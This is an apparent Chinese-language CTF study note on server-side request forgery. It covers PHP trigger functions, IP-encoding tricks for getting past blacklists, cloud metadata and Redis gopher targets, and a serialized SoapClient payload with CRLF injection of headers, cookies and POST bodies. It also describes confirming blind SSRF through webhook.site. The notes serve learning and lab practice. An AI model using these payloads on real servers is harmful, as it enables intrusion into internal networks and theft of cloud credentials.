# 08 · SSRF（服务端请求伪造）

> 状态：🔄 进行中（从 un9/un92 实战中学到）

---

# 一、是什么

**SSRF = Server-Side Request Forgery**

> **让"服务器"代替"你"去发请求。**

---

# 二、为什么危险

**因为"服务器"在网络里的位置和你不同**：

```
你（外网）
  ├─→ 能访问：公网页面 ✅
  └─→ 不能访问：127.0.0.1 / 内网 ❌

服务器自己
  ├─→ 能访问：公网 ✅
  └─→ 能访问：127.0.0.1 / 内网 ✅   ← 你借它的手
```

---

# 三、`REMOTE_ADDR` 为什么不能伪造

**代码**：
```php
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("必须本地访问");
```

**试过的头部（全部无效）**：
```
X-Forwarded-For: 127.0.0.1    ❌
X-Real-IP: 127.0.0.1          ❌
X-Client-IP: 127.0.0.1        ❌
```

**⭐ `REMOTE_ADDR` 是 TCP 连接的源地址** —— **由内核填充，HTTP 层改不了。**

**→ 唯一办法：SSRF。**

---

# 四、常见 SSRF 触发点

```php
file_get_contents($url);
curl_exec($ch);
fsockopen($host, $port);
fopen($url, 'r');
getimagesize($url);
md5_file($url);

// SoapClient（反序列化场景）
new SoapClient(null, ['location' => $url]);
// 调用任意不存在的方法 → __call → 发请求
```

---

# 五、SSRF 能干什么

| 用途 | 例子 |
|---|---|
| **访问内网/本地服务** | `http://127.0.0.1/admin.php` |
| **绕过 IP 白名单** | 让服务器以"自己"的身份访问 |
| **端口扫描** | `http://127.0.0.1:22`、`:3306`、`:6379` |
| **读云元数据** | `http://169.254.169.254/`（AWS） |
| **打内网其他系统** | `http://192.168.1.x/` |
| **Gopher 打 Redis/MySQL** | `gopher://127.0.0.1:6379/_...` |

---

# 六、绕过 IP 黑名单（IP 变形）

```
127.0.0.1        原形
2130706433       十进制
0177.0.0.1       八进制
0x7f.0.0.1       十六进制
127.1            简写
[::1]            IPv6
http://0.0.0.0/  也常指向本机
```

---

# 七、SoapClient + CRLF 注入（**实战重点**）

## 7.1 SoapClient 的 SSRF

```php
class SoapClient {
    // 调用不存在的方法 → 触发 __call → 向 $location 发 HTTP POST
}
```

**反序列化 payload**：
```
O:10:"SoapClient":2:{s:3:"uri";s:1:"x";s:8:"location";s:25:"http://127.0.0.1/un92.php";}
```

**报错解读（用来探测）**：
| 报错 | 含义 |
|---|---|
| `Error could not find "location" property` | 缺 `location` 属性 |
| `looks like we got no XML document` | **有服务、有响应**（但非 XML） |
| `[HTTP] Not Found` | 有服务，路径 404 |
| `[HTTP] Could not connect to host` | 端口不通 |
| `Unknown protocol. Only http and https are allowed` | 协议被禁 |

## 7.2 CRLF 注入（`uri` 属性）

**原理**：`SoapClient` 把 `uri` 拼进 `SOAPAction` 头：
```http
SOAPAction: "<uri>#<方法名>"
```
**`uri` 里含 `\r\n` → 可注入任意 HTTP 头！**

**注入 Header**：
```php
$uri = "aaab\r\nX-Test-Injected: HELLO123";
```

**注入 POST body**：
```php
$uri = "aaab\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 17\r\n\r\nINJECTED_BODY=YES";
```
生成：
```http
POST / HTTP/1.1
Host: target
User-Agent: PHP-SOAP/5.5.38
Content-Type: text/xml; charset=utf-8        ← SoapClient 默认（在前）
SOAPAction: "aaab                             ← 被截断
Content-Type: application/x-www-form-urlencoded   ← 注入的
Content-Length: 17
                                              ← 空行
INJECTED_BODY=YES                             ← body 被控制！
```

**注入 Cookie**：
```php
$uri = "aaab\r\nCookie: py=flag; url=xxx\r\nX: ";
// 末尾的 \r\nX: 用来把 "uri#方法名" 的垃圾挡进下一个头
```

## 7.3 各属性有效性（**PHP 5.5 实测**）

| 属性 | 是否可注入 | 说明 |
|---|---|---|
| **`uri`** | ✅ **有效** | 拼进 `SOAPAction` |
| `location` | ❌ | 不能注入 CRLF（会被当 URL 的一部分 → 404） |
| `user_agent` | ❌ **无效** | UA 固定 `PHP-SOAP/5.5.38`（网上写法是 PHP 7 的） |

**⚠️ 协议限制**：只允许 `http` / `https`（`gopher://`、`dict://`、`php://` 全被禁）。

---

# 八、用 Webhook 验证盲 SSRF（**方法论**）

**问题**：SSRF 是"盲"的，你看不到服务器发了什么。

**解决**：让服务器请求**你能看的地方**。

| 服务 | 说明 |
|---|---|
| **webhook.site** | ⭐ 打开就用，实时显示请求 |
| requestcatcher.com | 同上 |
| 自己的 VPS | `python3 -m http.server 80` |

**⭐ webhook.site 的 JSON API**（程序化读取）：
```
https://webhook.site/token/<uuid>/requests?sorting=newest&per_page=5
```

**验证清单**：
| 验证什么 | 怎么做 |
|---|---|
| 请求能不能发出 | `location` 指向 webhook |
| CRLF 注入是否生效 | 注入 `X-Test: xxx`，看 header |
| body 是否可控 | 注入 `Content-Length` + body，看 `content` 字段 |

---

# 九、一句话

> **SSRF = 让服务器代替你发请求**。**`REMOTE_ADDR` 是 TCP 层，改不了 → 必须 SSRF**。**`SoapClient` 的 `__call` 是反序列化场景的 SSRF 入口**。**`uri` 属性可 CRLF 注入任意头 + POST body**（**PHP 5.5 的 `user_agent` 无效**）。**验证用 webhook.site**。
